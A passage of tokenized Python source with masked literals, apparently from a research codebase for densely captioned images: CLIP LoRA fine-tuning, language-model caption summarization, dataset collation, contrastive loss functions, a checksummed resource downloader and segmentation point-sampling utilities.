'<STR_LIT>' , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> caption_negative_strategy : str = field ( <EOL> default = '<STR_LIT>' , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> train_count : int = field ( <EOL> default = <NUM_LIT> , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> valid_count : int = field ( <EOL> default = <NUM_LIT> , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> lr : float = field ( <EOL> default = <NUM_LIT> , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> bs : int = field ( <EOL> default = <NUM_LIT> , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> loss_alpha : float = field ( <EOL> default = <NUM_LIT> , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> loss_beta : float = field ( <EOL> default = <NUM_LIT> , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> caption_selection : str = field ( <EOL> default = '<STR_LIT>' , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> sampler : str = field ( <EOL> default = '<STR_LIT>' , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> loss_pool_type : str = field ( <EOL> default = '<STR_LIT>' , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> datasource : str = field ( <EOL> default = "<STR_LIT>" , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } <EOL> ) <EOL> epochs : int = field ( <EOL> default = <NUM_LIT> , <EOL> metadata = { "<STR_LIT>" : "<STR_LIT>" } , <EOL> ) <EOL> config = ConfigStoreWithProvider ( "<STR_LIT>" ) <EOL> config . store ( name = "<STR_LIT>" , node = CLIPAndNegConfig ) <EOL> def get_dir_name ( cfg ) : <EOL> base = "<STR_LIT>" <EOL> if cfg . datasource == '<STR_LIT>' : <EOL> base = "<STR_LIT>" <EOL> if cfg . datasource == '<STR_LIT>' : <EOL> base = "<STR_LIT>" <EOL> base += ( <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> f"<STR_LIT>" <EOL> ) <EOL> if cfg . caption_selection . startswith ( '<STR_LIT>' ) and cfg . caption_selection != '<STR_LIT>' : <EOL> base += f"<STR_LIT>" <EOL> if cfg . use_subcaptions is False : <EOL> base += f"<STR_LIT>" <EOL> return base <EOL> class CLIPTrainJob : <EOL> def __call__ ( self , * args , ** kwargs ) : <EOL> run_train_clip ( args [ <NUM_LIT> ] ) <EOL> def checkpoint ( self , * args : Any , ** kwargs : Any ) -> submitit . helpers . DelayedSubmission : <EOL> return submitit . helpers . DelayedSubmission ( self , * args , ** kwargs ) <EOL> @ hydra . main ( <EOL> config_path = HYDRA_CONFIG_PATH , config_name = "<STR_LIT>" , version_base = "<STR_LIT>" <EOL> ) <EOL> def run_train_clip ( cfg : CLIPAndNegConfig ) : <EOL> print ( '<STR_LIT>' ) <EOL> model = CLIPModel . from_pretrained ( "<STR_LIT>" ) <EOL> processor = CLIPProcessor . from_pretrained ( "<STR_LIT>" ) <EOL> print_trainable_parameters ( model ) <EOL> print ( "<STR_LIT>" ) <EOL> l_config = LoraConfig ( <EOL> r = cfg . lora_r , <EOL> lora_alpha = cfg . lora_alpha , <EOL> target_modules = [ <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" <EOL> ] , <EOL> lora_dropout = cfg . lora_dropout , <EOL> bias = "<STR_LIT>" , <EOL> ) <EOL> lora_model = get_peft_model ( model , l_config ) <EOL> print_trainable_parameters ( lora_model ) <EOL> use_antonyms = cfg . caption_negative_source == '<STR_LIT>' <EOL> caption_count = <NUM_LIT> <EOL> if cfg . caption_selection . startswith ( '<STR_LIT>' ) : <EOL> caption_count = int ( cfg . caption_selection [ <NUM_LIT> : ] ) <EOL> if cfg . datasource == '<STR_LIT>' : <EOL> print ( "<STR_LIT>" ) <EOL> train_ds = get_clip_ready_ds ( <EOL> split = '<STR_LIT>' , <EOL> load_base_image = cfg . use_base_images , <EOL> load_subcaptions = cfg . use_subcaptions , <EOL> negative_source = cfg . caption_negative_source , <EOL> negative_strategy = cfg . caption_negative_strategy , <EOL> count = cfg . train_count , <EOL> caption_bag_size = caption_count , <EOL> ) <EOL> eval_ds = get_clip_ready_ds ( <EOL> split = '<STR_LIT>' , <EOL> load_base_image = cfg . use_base_images , <EOL> load_subcaptions = cfg . use_subcaptions , <EOL> negative_source = cfg . caption_negative_source , <EOL> negative_strategy = cfg . caption_negative_strategy , <EOL> count = cfg . valid_count , <EOL> caption_bag_size = caption_count , <EOL> ) <EOL> elif cfg . datasource == '<STR_LIT>' : <EOL> print ( "<STR_LIT>" ) <EOL> train_source = get_loc_nar_dataset_source ( '<STR_LIT>' , cfg . train_count , use_antonyms = use_antonyms ) <EOL> valid_source = get_loc_nar_dataset_source ( '<STR_LIT>' , cfg . valid_count , use_antonyms = True ) <EOL> train_ds = COCOLocalizedNarrativesDataset ( train_source ) <EOL> eval_ds = COCOLocalizedNarrativesDataset ( valid_source ) <EOL> elif cfg . datasource == '<STR_LIT>' : <EOL> train_source = get_coco_dataset_source ( '<STR_LIT>' , cfg . train_count , use_antonyms = use_antonyms ) <EOL> valid_source = get_coco_dataset_source ( '<STR_LIT>' , cfg . valid_count , use_antonyms = True ) <EOL> train_ds = COCODataset ( train_source , caption_count ) <EOL> eval_ds = COCODataset ( valid_source , <NUM_LIT> ) <EOL> else : <EOL> raise NotImplementedError ( f'<STR_LIT>' ) <EOL> print ( f"<STR_LIT>" ) <EOL> output_dir = os . path . join ( MODEL_PATH , get_dir_name ( cfg ) ) <EOL> epochs = cfg . epochs <EOL> training_args = TrainingArguments ( <EOL> report_to = '<STR_LIT>' , <EOL> output_dir = output_dir , <EOL> learning_rate = cfg . lr , <EOL> num_train_epochs = epochs , <EOL> per_device_train_batch_size = cfg . bs , <EOL> per_device_eval_batch_size = cfg . bs , <EOL> save_total_limit = <NUM_LIT> , <EOL> optim = "<STR_LIT>" , <EOL> evaluation_strategy = '<STR_LIT>' , <EOL> eval_steps = <NUM_LIT> / ( <NUM_LIT> * epochs ) , <EOL> save_strategy = '<STR_LIT>' , <EOL> save_steps = <NUM_LIT> / ( <NUM_LIT> * epochs ) , <EOL> logging_steps = <NUM_LIT> , <EOL> logging_dir = os . path . join ( MODEL_PATH , '<STR_LIT>' , get_dir_name ( cfg ) ) , <EOL> remove_unused_columns = False , <EOL> label_names = [ "<STR_LIT>" , "<STR_LIT>" , "<STR_LIT>" ] , <EOL> dataloader_drop_last = True , <EOL> do_train = True , <EOL> do_eval = True , <EOL> include_inputs_for_metrics = True , <EOL> load_best_model_at_end = True , <EOL> ) <EOL> trainer = ClipAndNegTrainer ( <EOL> model = lora_model , <EOL> args = training_args , <EOL> train_dataset = train_ds , <EOL> eval_dataset = eval_ds , <EOL> compute_metrics = compute_metrics , <EOL> loss_alpha = cfg . loss_alpha , <EOL> loss_beta = cfg . loss_beta , <EOL> sampler = cfg . sampler , <EOL> loss_pool_type = cfg . loss_pool_type , <EOL> ) <EOL> if os . path . exists ( output_dir ) and len ( os . listdir ( output_dir ) ) > <NUM_LIT> : <EOL> trainer . train ( resume_from_checkpoint = True ) <EOL> else : <EOL> trainer . train ( ) <EOL> from densely_captioned_images . dataset . scripts . run_clip_dense_cap_eval import run_dense_cap_test <EOL> run_dense_cap_test ( lora_model , processor ) <EOL> if __name__ == '<STR_LIT>' : <EOL> run_train_clip ( ) <EOL> </s>
<s> from long_captions . dense_image import DenseCaptionedImage , get_key_for <EOL> from long_captions . prepare . remote_language_model import RemoteLanguageModel <EOL> from long_captions . utils import get_clip_token_length , truncate_long_captions <EOL> from long_captions . config import OUTPUT_SUMMARY_PATH <EOL> import os <EOL> import json <EOL> import threading <EOL> from queue import Queue <EOL> from typing import Dict , Any , Optional , Tuple <EOL> IDX_TARGET = <NUM_LIT> <EOL> DEBUG = False <EOL> SKIP_EXISTING = False <EOL> NUM_THREADS = <NUM_LIT> <EOL> def gen_summaries_for ( idx , rlm , max_fails = <NUM_LIT> , existing = None ) -> Tuple [ Optional [ Dict [ str , Any ] ] , bool , bool ] : <EOL> failures = <NUM_LIT> <EOL> dci = DenseCaptionedImage ( idx ) <EOL> if existing is not None : <EOL> summaries = existing <EOL> else : <EOL> summaries = { <EOL> '<STR_LIT>' : None , <EOL> } <EOL> created_any = False <EOL> while summaries [ '<STR_LIT>' ] is None or get_clip_token_length ( summaries [ '<STR_LIT>' ] ) > <NUM_LIT> : <EOL> try : <EOL> base_caption = dci . get_formatted_complete_description ( ) [ <NUM_LIT> ] [ '<STR_LIT>' ] <EOL> base_caption = truncate_long_captions ( base_caption ) <EOL> summary_caption = rlm . get_summary ( base_caption ) <EOL> assert get_clip_token_length ( summary_caption ) < <NUM_LIT> , "<STR_LIT>" <EOL> summary_caption_reduced = rlm . reduce_length ( summary_caption ) <EOL> summaries [ '<STR_LIT>' ] = summary_caption_reduced <EOL> created_any = True <EOL> except AssertionError as e : <EOL> if DEBUG : <EOL> import traceback <EOL> traceback . print_exc ( ) <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> failures += <NUM_LIT> <EOL> if failures >= max_fails : <EOL> return summaries , created_any , False <EOL> all_masks = dci . filter_masks_by_size ( ) <EOL> for m in all_masks : <EOL> entry = dci . get_caption_with_subcaptions ( m ) [ <NUM_LIT> ] <EOL> key = entry [ '<STR_LIT>' ] <EOL> caption = entry [ '<STR_LIT>' ] <EOL> if key in summaries and get_clip_token_length ( summaries [ key ] ) <= <NUM_LIT> : <EOL> continue <EOL> mask_sum_caption = None <EOL> short = get_clip_token_length ( caption ) <= <NUM_LIT> <EOL> while mask_sum_caption is None : <EOL> try : <EOL> caption = truncate_long_captions ( caption ) <EOL> mask_sum_caption_long = rlm . get_summary ( caption , short = short ) <EOL> assert get_clip_token_length ( mask_sum_caption_long ) < <NUM_LIT> , "<STR_LIT>" <EOL> mask_sum_caption = rlm . reduce_length ( mask_sum_caption_long ) <EOL> summaries [ key ] = mask_sum_caption <EOL> created_any = True <EOL> except AssertionError as e : <EOL> if DEBUG : <EOL> import traceback <EOL> traceback . print_exc ( ) <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> failures += <NUM_LIT> <EOL> if failures >= max_fails : <EOL> return summaries , created_any , False <EOL> if DEBUG : <EOL> print ( summaries ) <EOL> return summaries , created_any , True <EOL> def thread_entry ( idx_pool : Queue , rlm ) : <EOL> while not idx_pool . empty ( ) : <EOL> i , existing = idx_pool . get ( ) <EOL> key = get_key_for ( i ) <EOL> if int ( i ) % <NUM_LIT> == <NUM_LIT> : <EOL> print ( f"<STR_LIT>" ) <EOL> target_path = os . path . join ( OUTPUT_SUMMARY_PATH , key ) <EOL> summaries , created_any , success = gen_summaries_for ( i , rlm , existing = existing ) <EOL> if created_any is False : <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> else : <EOL> if success is False : <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> with open ( target_path , '<STR_LIT>' ) as jsonf : <EOL> json . dump ( summaries , jsonf ) <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> continue <EOL> def run_gen_summary ( ) : <EOL> rlm = RemoteLanguageModel ( '<STR_LIT>' ) <EOL> idx_pool = Queue ( ) <EOL> for i in range ( IDX_TARGET ) : <EOL> key = get_key_for ( i ) <EOL> target_path = os . path . join ( OUTPUT_SUMMARY_PATH , key ) <EOL> existing = None <EOL> if os . path . exists ( target_path ) : <EOL> if SKIP_EXISTING : <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> continue <EOL> else : <EOL> with open ( target_path ) as jsonf : <EOL> existing = json . load ( jsonf ) <EOL> idx_pool . put ( ( i , existing ) ) <EOL> thread_pool = [ ] <EOL> for _ in range ( NUM_THREADS ) : <EOL> t = threading . Thread ( target = thread_entry , args = ( idx_pool , rlm ) ) <EOL> t . start ( ) <EOL> thread_pool . append ( t ) <EOL> for thread in thread_pool : <EOL> thread . join ( ) <EOL> if __name__ == '<STR_LIT>' : <EOL> run_gen_summary ( ) <EOL> </s>
<s> import os <EOL> import json <EOL> from long_captions . utils import get_clip_token_length <EOL> from long_captions . config import OUTPUT_SUMMARY_PATH , OUTPUT_NEGATIVE_PATH , DATASET_ANNOTATION_DUMP , DATASET_COMPLETE_PATH <EOL> ANNOTATION_PATH = DATASET_ANNOTATION_DUMP <EOL> IDX_TARGET = <NUM_LIT> <EOL> DEBUG = False <EOL> SKIP_EXISTING = False <EOL> NUM_THREADS = <NUM_LIT> <EOL> def ensure_size ( text , max_size = <NUM_LIT> ) : <EOL> text = text . strip ( ) <EOL> assert get_clip_token_length ( text ) <= max_size , f"<STR_LIT>" <EOL> return text <EOL> def run_collate ( ) : <EOL> entries = os . listdir ( ANNOTATION_PATH ) <EOL> for e in entries : <EOL> try : <EOL> source_path = os . path . join ( ANNOTATION_PATH , e ) <EOL> summary_path = os . path . join ( OUTPUT_SUMMARY_PATH , e ) <EOL> negative_path = os . path . join ( OUTPUT_NEGATIVE_PATH , e ) <EOL> output_path = os . path . join ( DATASET_COMPLETE_PATH , e ) <EOL> if os . path . exists ( output_path ) : <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> continue <EOL> if not os . path . exists ( summary_path ) : <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> continue <EOL> if not os . path . exists ( negative_path ) : <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> continue <EOL> with open ( source_path ) as jsonf : <EOL> source_dict = json . load ( jsonf ) <EOL> with open ( summary_path ) as jsonf : <EOL> summary_dict = json . load ( jsonf ) <EOL> with open ( negative_path ) as jsonf : <EOL> negative_dict = json . load ( jsonf ) <EOL> if len ( negative_dict ) == <NUM_LIT> : <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> continue <EOL> if '<STR_LIT>' in summary_dict : <EOL> del summary_dict [ '<STR_LIT>' ] <EOL> if '<STR_LIT>' in negative_dict : <EOL> del negative_dict [ '<STR_LIT>' ] <EOL> summary_dict = { k : ensure_size ( summary ) for k , summary in summary_dict . items ( ) } <EOL> negative_dict = { <EOL> k : { <EOL> neg_type : [ <EOL> ensure_size ( n . strip ( ) ) for n in sub_negatives <EOL> ] for neg_type , sub_negatives in negatives . items ( ) <EOL> } for k , negatives in negative_dict . items ( ) <EOL> } <EOL> source_dict [ '<STR_LIT>' ] = summary_dict <EOL> source_dict [ '<STR_LIT>' ] = negative_dict <EOL> assert len ( source_dict [ '<STR_LIT>' ] ) == len ( source_dict [ '<STR_LIT>' ] ) <EOL> with open ( output_path , '<STR_LIT>' ) as jsonf : <EOL> json . dump ( source_dict , jsonf ) <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> except Exception as _ : <EOL> print ( '<STR_LIT>' , end = '<STR_LIT>' , flush = True ) <EOL> with open ( '<STR_LIT>' , '<STR_LIT>' ) as fn : <EOL> fn . write ( e + "<STR_LIT>" ) <EOL> continue <EOL> if __name__ == '<STR_LIT>' : <EOL> run_collate ( ) <EOL> </s>
<s> import torch <EOL> from torch import nn <EOL> def get_grouped_diag ( logits : torch . Tensor ) -> torch . Tensor : <EOL> dims = logits . shape <EOL> bs = dims [ <NUM_LIT> ] <EOL> N = dims [ <NUM_LIT> ] // bs <EOL> def do_keep ( a ) : <EOL> rowsize = N * bs <EOL> curr_row = a // rowsize <EOL> curr_col = ( a % rowsize ) // N <EOL> return curr_col == curr_row <EOL> index_ten = torch . arange ( N * bs * bs ) . reshape ( ( bs , N * bs ) ) <EOL> return logits [ do_keep ( index_ten ) ] . reshape ( bs , N ) <EOL> def get_pooled_groups ( logits : torch . Tensor , pool_type = '<STR_LIT>' ) -> torch . Tensor : <EOL> dims = logits . shape <EOL> bs = dims [ <NUM_LIT> ] <EOL> N = dims [ <NUM_LIT> ] // bs <EOL> grouped = logits . reshape ( ( bs , bs , N ) ) <EOL> if pool_type == '<STR_LIT>' : <EOL> return torch . mean ( grouped , dim = <NUM_LIT> ) <EOL> elif pool_type == '<STR_LIT>' : <EOL> return torch . max ( grouped , dim = <NUM_LIT> ) . values <EOL> elif pool_type == '<STR_LIT>' : <EOL> return torch . min ( grouped , dim = <NUM_LIT> ) . values <EOL> def get_pooled_diag ( logits : torch . Tensor , pool_type = '<STR_LIT>' ) -> torch . Tensor : <EOL> return get_pooled_groups ( logits , pool_type = pool_type ) . diag ( ) <EOL> def contrastive_loss ( logits : torch . Tensor ) -> torch . Tensor : <EOL> return nn . functional . cross_entropy ( logits , torch . arange ( len ( logits ) , device = logits . device ) ) <EOL> def clip_loss ( similarity : torch . Tensor , pool_type = '<STR_LIT>' ) -> torch . Tensor : <EOL> if pool_type == '<STR_LIT>' : <EOL> similarity = get_pooled_groups ( similarity , pool_type = '<STR_LIT>' ) <EOL> min_sim_diag = get_pooled_diag ( similarity , pool_type = '<STR_LIT>' ) <EOL> similarity [ range ( len ( min_sim_diag ) ) , range ( len ( min_sim_diag ) ) ] = min_sim_diag <EOL> else : <EOL> similarity = get_pooled_groups ( similarity ) <EOL> caption_loss = contrastive_loss ( similarity ) <EOL> image_loss = contrastive_loss ( similarity . t ( ) ) <EOL> return ( caption_loss + image_loss ) / <NUM_LIT> <EOL> def negatives_loss_pairwise ( scores : torch . Tensor ) -> torch . Tensor : <EOL> label = torch . tensor ( [ [ <NUM_LIT> , <NUM_LIT> ] ] , device = scores . device ) . float ( ) <EOL> labels = label . tile ( ( scores . size ( ) [ <NUM_LIT> ] , <NUM_LIT> ) ) <EOL> neg_loss = nn . functional . binary_cross_entropy_with_logits ( scores , labels ) <EOL> return neg_loss <EOL> def negatives_loss ( pos_scores : torch . Tensor , neg_scores : torch . Tensor , pool_type = '<STR_LIT>' ) -> torch . Tensor : <EOL> pos_pool_type = '<STR_LIT>' if pool_type == '<STR_LIT>' else pool_type <EOL> neg_pool_type = '<STR_LIT>' if pool_type == '<STR_LIT>' else pool_type <EOL> pos_diag = get_pooled_diag ( pos_scores , pool_type = pos_pool_type ) <EOL> neg_diag = get_pooled_diag ( neg_scores , pool_type = neg_pool_type ) <EOL> res = torch . stack ( ( pos_diag , neg_diag ) , axis = - <NUM_LIT> ) <EOL> return negatives_loss_pairwise ( res ) <EOL> </s>
<s> import os <EOL> import requests <EOL> import tarfile <EOL> from tqdm import tqdm <EOL> import logging <EOL> import time <EOL> from densely_captioned_images . dataset . config import DATASET_BASE , MODEL_BASE <EOL> import hashlib <EOL> RESOURCES = { <EOL> '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } , <EOL> '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } , <EOL> '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } , <EOL> } <EOL> def check_checksum ( file_download_location , target_checksum ) : <EOL> sha256_hash = hashlib . sha256 ( ) <EOL> with open ( file_download_location , '<STR_LIT>' ) as f : <EOL> for byte_block in iter ( lambda : f . read ( <NUM_LIT> ) , b"<STR_LIT>" ) : <EOL> sha256_hash . update ( byte_block ) <EOL> assert sha256_hash . hexdigest ( ) == target_checksum , ( <EOL> f"<STR_LIT>" <EOL> ) <EOL> return <EOL> def download_file ( target_dir , file_meta , num_retries = <NUM_LIT> ) : <EOL> url = file_meta [ '<STR_LIT>' ] <EOL> outfile = file_meta [ '<STR_LIT>' ] . split ( '<STR_LIT>' ) [ - <NUM_LIT> ] <EOL> download = True <EOL> logging . info ( f"<STR_LIT>" ) <EOL> retry = num_retries <EOL> exp_backoff = [ <NUM_LIT> ** r for r in reversed ( range ( retry ) ) ] <EOL> pbar = tqdm ( unit = '<STR_LIT>' , unit_scale = True , desc = '<STR_LIT>' . format ( outfile ) ) <EOL> while download and retry > <NUM_LIT> : <EOL> response = None <EOL> with requests . Session ( ) as session : <EOL> try : <EOL> response = session . get ( url , stream = True , timeout = <NUM_LIT> ) <EOL> CHUNK_SIZE = <NUM_LIT> <EOL> total_size = int ( response . headers . get ( '<STR_LIT>' , - <NUM_LIT> ) ) <EOL> pbar . total = total_size <EOL> done = <NUM_LIT> <EOL> with open ( outfile , '<STR_LIT>' ) as f : <EOL> for chunk in response . iter_content ( CHUNK_SIZE ) : <EOL> if chunk : <EOL> f . write ( chunk ) <EOL> if total_size > <NUM_LIT> : <EOL> done += len ( chunk ) <EOL> if total_size < done : <EOL> total_size = done <EOL> pbar . total = total_size <EOL> pbar . update ( len ( chunk ) ) <EOL> break <EOL> except ( <EOL> requests . exceptions . ConnectionError , <EOL> requests . exceptions . ReadTimeout , <EOL> ) : <EOL> retry -= <NUM_LIT> <EOL> pbar . clear ( ) <EOL> if retry > <NUM_LIT> : <EOL> pl = '<STR_LIT>' if retry == <NUM_LIT> else '<STR_LIT>' <EOL> logging . debug ( <EOL> f'<STR_LIT>' <EOL> ) <EOL> time . sleep ( exp_backoff [ retry ] ) <EOL> else : <EOL> logging . error ( '<STR_LIT>' ) <EOL> finally : <EOL> if response : <EOL> response . close ( ) <EOL> if retry <= <NUM_LIT> : <EOL> raise RuntimeError ( '<STR_LIT>' ) <EOL> if download and retry > <NUM_LIT> : <EOL> pbar . update ( done - pbar . n ) <EOL> if done < total_size : <EOL> raise RuntimeError ( <EOL> f'<STR_LIT>' <EOL> f'<STR_LIT>' <EOL> ) <EOL> pbar . close ( ) <EOL> check_checksum ( outfile , file_meta [ '<STR_LIT>' ] ) <EOL> logging . info ( f"<STR_LIT>" ) <EOL> os . makedirs ( target_dir , exist_ok = True ) <EOL> with tarfile . open ( outfile , '<STR_LIT>' ) as tar : <EOL> for member in tqdm ( iterable = tar . getmembers ( ) , total = len ( tar . getmembers ( ) ) ) : <EOL> tar . extract ( path = target_dir , member = member ) <EOL> os . unlink ( outfile ) <EOL> def run_downloads ( ) : <EOL> for dsname in [ '<STR_LIT>' ] : <EOL> download_file ( os . path . dirname ( DATASET_BASE ) , RESOURCES [ dsname ] ) <EOL> for modelname in [ '<STR_LIT>' , '<STR_LIT>' ] : <EOL> download_file ( MODEL_BASE , RESOURCES [ modelname ] ) <EOL> if __name__ == '<STR_LIT>' : <EOL> run_downloads ( ) <EOL> </s>
<s> import random <EOL> import numpy as np <EOL> import json <EOL> from tqdm import tqdm <EOL> import cv2 <EOL> from . efficient_mask import EfficientMask , Point , Xdm , Ydm , all_mask_union <EOL> from typing import Optional , List , Dict , Literal , Union , TypedDict , Any , Tuple , cast , TYPE_CHECKING <EOL> if TYPE_CHECKING : <EOL> from segment_anything import SamPredictor <EOL> TARGET_STEP = <NUM_LIT> <EOL> SKIP_LOGGING = True <EOL> MaskMergeKey = Union [ Literal [ '<STR_LIT>' ] , Literal [ '<STR_LIT>' ] ] <EOL> class GroupItem ( TypedDict ) : <EOL> outer_mask : EfficientMask <EOL> points : List [ Point ] <EOL> submasks : List [ EfficientMask ] <EOL> GroupDictKey = Union [ int , Literal [ '<STR_LIT>' ] ] <EOL> GroupDict = Dict [ GroupDictKey , GroupItem ] <EOL> class FinalGroup ( TypedDict ) : <EOL> outer_mask : EfficientMask <EOL> subgroups : Dict [ Union [ int , str ] , "<STR_LIT>" ] <EOL> FinalGrouping = Dict [ Union [ int , str ] , FinalGroup ] <EOL> def jitter ( size : float ) -> float : <EOL> return ( <NUM_LIT> - random . random ( ) ) * size <EOL> def bound ( v , lo , hi ) : <EOL> return int ( max ( min ( hi , v ) , lo ) ) <EOL> def _load_final_group_from_json ( json_dict ) -> FinalGroup : <EOL> from PIL import Image <EOL> from io import BytesIO <EOL> import base64 <EOL> as_str = json_dict [ '<STR_LIT>' ] <EOL> im = Image . open ( BytesIO ( base64 . b64decode ( as_str ) ) ) <EOL> mask_array = np . array ( im ) <EOL> return { <EOL> '<STR_LIT>' : EfficientMask ( mask_array , - <NUM_LIT> ) , <EOL> '<STR_LIT>' : { <EOL> idx : _load_final_group_from_json ( val ) for ( idx , val ) in json_dict [ '<STR_LIT>' ] . items ( ) <EOL> } , <EOL> } <EOL> def load_final_group_from_json ( json_dict ) -> FinalGrouping : <EOL> res : FinalGrouping = { <EOL> idx : _load_final_group_from_json ( val ) for ( idx , val ) in json_dict . items ( ) <EOL> } <EOL> return res <EOL> def get_grid ( <EOL> step : int , <EOL> top_left : Point , <EOL> bottom_right : Point , <EOL> noise : Optional [ float ] = None <EOL> ) -> List [ Point ] : <EOL> top , left = top_left <EOL> bottom , right = bottom_right <EOL> if noise is None : <EOL> noise = step / <NUM_LIT> <EOL> height = bottom - top <EOL> width = right - left <EOL> height_steps = height // step - <NUM_LIT> <EOL> width_steps = width // step - <NUM_LIT> <EOL> height_step_size = ( height - step ) / height_steps <EOL> width_step_size = ( width - step ) / width_steps <EOL> points : List [ Point ] = [ ] <EOL> for j in range ( width_steps + <NUM_LIT> ) : <EOL> for i in range ( height_steps + <NUM_LIT> ) : <EOL> points . append ( ( <EOL> cast ( Ydm , int ( top + step / <NUM_LIT> + i * height_step_size + jitter ( noise ) ) ) , <EOL> cast ( Xdm , int ( left + step / <NUM_LIT> + j * width_step_size + jitter ( noise ) ) ) <EOL> ) ) <EOL> return points <EOL> def get_missing_points_greedy ( mask : np . ndarray , min_size : int ) -> List [ Point ] : <EOL> curr_mask = np . copy ( mask ) <EOL> np_where = cast ( Tuple [ List [ Ydm ] , List [ Xdm ] , Any ] , np . where ( curr_mask == False ) ) <EOL> possible_points = list ( zip ( np_where [ <NUM_LIT> ] , np_where [ <NUM_LIT> ] ) ) <EOL> found_points : List [ Point ] = [ ] <EOL> step = int ( min_size / <NUM_LIT> ) <EOL> checkpoints : List [ Tuple [ int , int ] ] = [ ( <NUM_LIT> , step ) , ( <NUM_LIT> , - step ) , ( step , <NUM_LIT> ) , ( - step , <NUM_LIT> ) ] <EOL> for ( y , x ) in possible_points : <EOL> clear = True <EOL> for ( dy , dx ) in checkpoints : <EOL> try : <EOL> if curr_mask [ y + dy ] [ x + dx ] != False : <EOL> clear = False <EOL> break <EOL> except IndexError : <EOL> clear = False <EOL> break <EOL> if clear : <EOL> curr_mask [ y - step : y + step , x - step : x + step ] = True <EOL> found_points . append ( ( cast ( Ydm , y ) , cast ( Xdm , x ) ) ) <EOL> return found_points <EOL> def get_points_from_canny_greedy ( <EOL> image : np . ndarray , <EOL> distance_threshold : int = <NUM_LIT> , <EOL> jitter_amount : int = <NUM_LIT> , <EOL> num_extra : int = <NUM_LIT> , <EOL> ) -> List [ Point ] : <EOL> blur_image = cv2 . bilateralFilter ( image , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ) <EOL> edges = cv2 . Canny ( image = blur_image , threshold1 = <NUM_LIT> , threshold2 = <NUM_LIT> ) <EOL> point_remask = edges == <NUM_LIT> <EOL> np_where = cast ( Tuple [ List [ Ydm ] , List [ Xdm ] , Any ] , np . where ( point_remask == True ) ) <EOL> possible_points = list ( zip ( np_where [ <NUM_LIT> ] , np_where [ <NUM_LIT> ] ) ) <EOL> random . shuffle ( possible_points ) <EOL> found_points : List [ Point ] = [ ] <EOL> step = int ( distance_threshold ) <EOL> while len ( possible_points ) > <NUM_LIT> : <EOL> ( y , x ) = possible_points . pop ( ) <EOL> if x < <NUM_LIT> or y < <NUM_LIT> or x > image . shape [ <NUM_LIT> ] - <NUM_LIT> or y > image . shape [ <NUM_LIT> ] - <NUM_LIT> : <EOL> continue <EOL> if point_remask [ y , x ] : <EOL> found_points . append ( ( cast ( Ydm , bound ( y , <NUM_LIT> , image . shape [ <NUM_LIT> ] - <NUM_LIT> ) ) , cast ( Xdm , bound ( x , <NUM_LIT> , image . shape [ <NUM_LIT> ] - <NUM_LIT> ) ) ) ) <EOL> for _ in range ( num_extra ) : <EOL> found_points . append ( ( <EOL> cast ( Ydm , bound ( y + jitter ( jitter_amount ) , <NUM_LIT> , image . shape [ <NUM_LIT> ] - <NUM_LIT> ) ) , <EOL> cast ( Xdm , bound ( x + jitter ( jitter_amount ) , <NUM_LIT> , image . shape [ <NUM_LIT> ] - <NUM_LIT> ) ) <EOL> ) ) <EOL> point_remask [ max ( <NUM_LIT> , y - step ) : y + step , max ( <NUM_LIT> , x - step ) : x + step ] = False <EOL> return found_points <EOL> def predict_all ( <EOL> predictor : "<STR_LIT>" , <EOL> image : np . ndarray , <EOL> step : int = TARGET_STEP , <EOL> top_left : Optional [ Point ] = None , <EOL> bottom_right : Optional [ Point ] = None , <EOL> containing_mask : Optional [ np . ndarray ] = None <EOL> ) -> Dict [ Point , List [ EfficientMask ] ] : <EOL> if top_left is None : <EOL> top_left = cast ( Point , ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> if bottom_right is None : <EOL> bottom_right = cast ( Point , ( image . shape [ <NUM_LIT> ] , image . shape [ <NUM_LIT> ] ) ) <EOL> grid_points = get_grid ( step , top_left , bottom_right , noise = <NUM_LIT> ) <EOL> if containing_mask is not None : <EOL> grid_points = [ pt for pt in grid_points if containing_mask [ pt ] ] <EOL> return predict_for_points ( 